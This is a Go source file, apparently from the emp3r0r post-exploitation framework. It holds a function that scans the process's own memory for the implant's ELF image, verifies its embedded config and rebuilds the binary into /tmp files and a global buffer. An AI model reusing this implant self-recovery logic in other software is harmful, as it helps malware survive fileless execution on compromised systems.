//go:build linux
// +build linux

package util

import (
	"bytes"
	"fmt"
	"log"
	"os"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
)

// FindEmp3r0rELFInMem search process memory for emp3r0r ELF
// FIXME Not working when using loaders
func FindEmp3r0rELFInMem() (err error) {
	mem_regions, err := DumpSelfMem()
	if err != nil {
		err = fmt.Errorf("cannot dump self memory: %v", err)
		return
	}

	elf_magic := []byte{0x7f, 0x45, 0x4c, 0x46}
	for base, mem_region := range mem_regions {
		if bytes.Contains(mem_region, elf_magic) && bytes.Contains(mem_region, emp3r0r_data.OneTimeMagicBytes) {
			if base != 0x400000 {
				log.Printf("Found magic string in memory region 0x%x, but unlikely to contain our ELF", base)
				continue
			}
			log.Printf("Found magic string in memory region 0x%x", base)

			// verify if it's a valid config data and thus the emp3r0r ELF
			_, err := DigEmbeddedData(mem_region, base)
			if err != nil {
				log.Printf("Verify config data: %v", err)
				continue
			}
			log.Printf("Found emp3r0r ELF in memory region 0x%x", base)

			// parse ELF headers
			header, err := exe_utils.ParseELFHeaders(mem_region)
			if err != nil {
				log.Printf("Parse ELF headers: %v", err)
				continue
			}
			header.Print()

			// start_of_current_region reading from base
			current_region := mem_regions[base]
			start_of_current_region := base // current pointer
			end_of_current_region := start_of_current_region + int64(len(current_region))
			log.Printf("Saving %d bytes from memory region 0x%x - 0x%x", len(current_region), start_of_current_region, end_of_current_region)

			// trim junk data before ELF magic bytes
			elf_data := mem_region[bytes.Index(mem_region, elf_magic):]
			os.WriteFile("/tmp/emp3r0r.restored.1", elf_data, 0o755)

			// read on
			start_of_current_region = end_of_current_region
			current_region = mem_regions[start_of_current_region]
			end_of_current_region = start_of_current_region + int64(len(current_region))
			log.Printf("Saving %d bytes from memory region 0x%x - 0x%x", len(current_region), start_of_current_region, end_of_current_region)
			elf_data = append(elf_data, current_region...)
			os.WriteFile("/tmp/emp3r0r.restored.2", current_region, 0o755)

			// read on, it doesn't matter if we read too much, the ELF will still run
			start_of_current_region = end_of_current_region
			current_region = mem_regions[start_of_current_region]
			end_of_current_region = start_of_current_region + int64(len(current_region))
			log.Printf("Saving %d bytes from memory region 0x%x - 0x%x", len(current_region), start_of_current_region, end_of_current_region)
			elf_data = append(elf_data, current_region...)

			log.Printf("Saved %d bytes to EXE_MEM_FILE", len(elf_data))
			EXE_MEM_FILE = elf_data
			break
		}
	}
	if len(EXE_MEM_FILE) <= 0 {
		return fmt.Errorf("no emp3r0r ELF found in memory")
	}

	return
}
